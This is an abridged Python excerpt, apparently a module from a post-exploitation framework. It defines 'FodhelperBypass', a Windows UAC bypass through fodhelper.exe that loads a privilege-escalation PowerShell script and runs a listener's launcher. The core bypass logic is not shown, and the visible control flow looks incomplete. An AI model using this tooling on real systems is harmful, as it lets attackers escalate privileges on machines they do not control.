...
class Module:
    ...
    def __init__(self, mainMenu, params=[]):
        ...
        self.info = {
            'Name': 'FodhelperBypass',

            'Author': ['Christian B. - winscripting.blog'],

            'Description': ("Bypasses UAC using fodhelper.exe."
    ...
    def generate(self):
        ...
        moduleSource = self.mainMenu.installPath + "data/module_source/privesc/BypassUAC-Fodhelper.ps1"
        ...
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            ...
            if launcher == "":
                ...
                script += "FodhelperBypass \"%s\"" % (launcher)
                return script
